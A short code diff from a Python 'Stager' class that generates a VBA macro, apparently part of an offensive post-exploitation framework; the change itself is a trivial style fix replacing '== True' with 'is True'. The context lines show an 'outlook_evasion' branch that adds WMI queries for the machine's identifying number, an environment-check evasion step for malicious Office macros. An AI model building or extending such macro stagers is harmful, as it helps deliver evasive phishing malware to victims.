@@ -207,7 +207,7 @@ class Stager(object):
 
             macro += "Public Function " + set_method + "() As Variant\n"
 
-            if outlook_evasion_bool == True:
+            if outlook_evasion_bool is True:
                 macro += '\tstrComputer = "."\n'
                 macro += '\tSet objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\cimv2")\n'
                 macro += '\tSet ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")\n'
